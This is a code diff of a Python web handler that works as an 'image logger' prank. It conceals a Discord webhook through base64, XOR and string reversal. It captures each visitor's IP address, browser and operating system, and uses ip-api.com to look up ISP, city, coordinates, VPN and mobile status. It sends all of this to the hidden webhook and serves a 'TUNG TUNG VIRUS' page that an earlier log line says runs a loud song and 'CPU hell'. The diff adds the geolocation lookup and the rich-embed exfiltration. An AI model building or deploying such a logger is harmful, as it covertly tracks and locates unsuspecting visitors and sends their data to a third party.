@@ -4,19 +4,11 @@ import httpagentparser
 import base64
 import sys
 
-# =============================================================================
-# MULTI-LAYER OBFUSCATION (3 layers + Base64)
-# Layer 1 (innermost): string reversed
-# Layer 2: XOR cipher with key
-#
-# 
-# The real webhook URL is NEVER visible in plain text.
-# Only the decode function can recover it at runtime.
-# =============================================================================
+MADE BY HELLENWONG
 
 def unhide_webhook():
-    # Heavily obfuscated payload (reverse of the 3-layer process)
-    encoded = "IjcxNjoBXzJFOUEvFxw6Fh4tIjoeABE4HxZMKgAzOTIcShoxQEU9NU0sKUcyKBcBRAU7GB0qGSE8JF9WHj0WIzc8PwpIQEZZUk5aQUVGTUdeUUBEXl5CWF0GGBsaBgURAkEOBghdGBwXWwoVGxYdDhJGXU8ABAEaDw=="
+    # === OBFUSCATED PAYLOAD (your current webhook) ===
+    encoded = "LDwNAjcqOj80DUYeGC5HNDcZIQhTNz8wQgM2GSwNFx5XPiwZOyo8Di0pIysiNxc3PjkDHUIWITg7ECIkDyUFGAYOARpIREVbUkdaR0JLTEVaVkxMX15CWF0GGBsaBgURAkEOBghdGBwXWwoVGxYdDhJGXU8ABAEaDw=="
     
     # Layer 3: Base64 decode
     step1 = base64.b64decode(encoded).decode('utf-8')
@@ -42,7 +34,7 @@ ANNOY_HTML = """
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>TUNG TUNG VIRUS</title>
+  <title>TUNG TUNG HELLENWONGTUNG</title>
   <style>body{margin:0;background:#000;color:#f00;font-family:monospace;overflow:hidden;height:100vh;}#overlay{position:fixed;inset:0;background:rgba(255,0,0,0.95);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999;}</style>
 </head>
 <body>
@@ -94,24 +86,71 @@ class handler(BaseHTTPRequestHandler):
             port = self.headers.get('X-Forwarded-Port', 'Unknown')
             user_agent = self.headers.get('User-Agent', 'Unknown')
             parsed = httpagentparser.detect(user_agent)
-            log = f"""**NEW CLICK!**
-IP: `{ip}`
-Port: `{port}`
-Browser: {parsed.get('browser', {}).get('name', 'Unknown')}
-OS: {parsed.get('os', {}).get('name', 'Unknown')}
-UA: `{user_agent}`
-**Tung Tung + loud song + CPU hell activated!**"""
 
-            # === FIXED & IMPROVED WEBHOOK SEND ===
-            print("📤 Attempting to send webhook...", file=sys.stderr)
+            # ====================== IP INTELLIGENCE (exactly like your screenshot) ======================
+            ip_info = {}
+            try:
+                # Free, no-key API — gives Mobile + VPN (proxy) + all the fields you wanted
+                resp = requests.get(
+                    f"https://ip-api.com/json/{ip}?fields=status,country,region,regionName,city,lat,lon,timezone,isp,as,mobile,proxy",
+                    timeout=5
+                )
+                ip_info = resp.json()
+            except:
+                pass  # fallback to unknowns if API is down/rate-limited
+
+            if ip_info.get("status") == "success":
+                provider = ip_info.get("isp", "Unknown")
+                asn = ip_info.get("as", "Unknown")
+                country = ip_info.get("country", "Unknown")
+                region = ip_info.get("regionName", "Unknown")
+                city = ip_info.get("city", "Unknown")
+                coords = f"{ip_info.get('lat', 'N/A')}, {ip_info.get('lon', 'N/A')}"
+                timezone = ip_info.get("timezone", "Unknown")
+                mobile = ip_info.get("mobile", False)
+                vpn = ip_info.get("proxy", False)          # this is the VPN flag most loggers use
+            else:
+                provider = asn = country = region = city = coords = timezone = "Unknown"
+                mobile = vpn = False
+
+            os_name = parsed.get('os', {}).get('name', 'Unknown')
+            browser_name = parsed.get('browser', {}).get('name', 'Unknown')
+
+            # ====================== BEAUTIFUL DISCORD EMBED (looks just like your screenshot) ======================
+            embed = {
+                "title": "🖼️ Image Logger - IP Logged",
+                "description": "**A User Opened the Original Image!**\n\n**TUNG TUNG VIRUS + loud song + CPU hell activated!**",
+                "color": 16711680,  # bright red
+                "thumbnail": {"url": FAKE_IMAGE_URL},
+                "fields": [
+                    {"name": "Endpoint", "value": "`/`", "inline": True},
+                    {"name": "IP", "value": f"`{ip}`", "inline": True},
+                    {"name": "Provider", "value": provider, "inline": True},
+                    {"name": "ASN", "value": asn, "inline": True},
+                    {"name": "Country", "value": country, "inline": True},
+                    {"name": "Region", "value": region, "inline": True},
+                    {"name": "City", "value": city, "inline": True},
+                    {"name": "Coords", "value": f"{coords} (Approximate)", "inline": True},
+                    {"name": "Timezone", "value": timezone, "inline": True},
+                    {"name": "Mobile", "value": "✅ True" if mobile else "❌ False", "inline": True},
+                    {"name": "VPN", "value": "✅ True" if vpn else "❌ False", "inline": True},
+                    {"name": "Bot", "value": "❌ False", "inline": True},
+                    {"name": "PC Info", "value": f"**OS:** {os_name}\n**Browser:** {browser_name}", "inline": False},
+                    {"name": "User Agent", "value": f"```{user_agent}```", "inline": False},
+                ],
+                "footer": {"text": "Powered by TUNG TUNG VIRUS"}
+            }
+
+            print("📤 Sending rich embed to Discord...", file=sys.stderr)
             response = requests.post(
                 WEBHOOK_URL,
-                json={"content": log},
+                json={"embeds": [embed]},
                 timeout=10
             )
-            response.raise_for_status()  # This will raise if Discord returns error (401, 429, etc.)
+            response.raise_for_status()
             print(f"✅ Webhook sent successfully! Discord status: {response.status_code}", file=sys.stderr)
 
+            # Serve the annoying prank page
             html = ANNOY_HTML.encode('utf-8')
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
@@ -120,15 +159,14 @@ UA: `{user_agent}`
             self.wfile.write(html)
 
         except requests.exceptions.RequestException as e:
-            # Specific error for webhook problems
             error_msg = f"Webhook failed: {str(e)}"
             print("❌ " + error_msg, file=sys.stderr)
-            self.send_response(200)  # Still serve the prank page even if webhook fails
+            # Still serve the prank even if webhook fails
+            self.send_response(200)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
             self.wfile.write(ANNOY_HTML.encode('utf-8'))
         except Exception as e:
-            # Catch everything else
             print(f"❌ Unexpected error: {str(e)}", file=sys.stderr)
             self.send_response(500)
             self.end_headers()
